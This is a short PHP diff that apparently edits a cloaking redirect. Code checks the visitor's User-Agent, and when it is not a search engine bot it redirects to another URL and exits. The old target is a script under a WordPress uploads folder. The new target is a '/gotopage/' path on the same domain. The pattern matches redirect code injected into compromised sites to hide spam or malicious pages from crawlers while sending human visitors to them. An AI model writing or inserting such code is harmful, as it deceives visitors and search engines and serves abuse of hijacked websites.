@@ -4,7 +4,7 @@
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     if (!preg_match('/google|bing|yandex|bot|spider|crawler/i', $user_agent)) {
-        header('Location: https://www.sookeregionchamber.com/wp-content/uploads/2021/03/blck/index.php?search=jav');
+        header('Location: https://www.sookeregionchamber.com/gotopage/');
         exit;
     }
 }
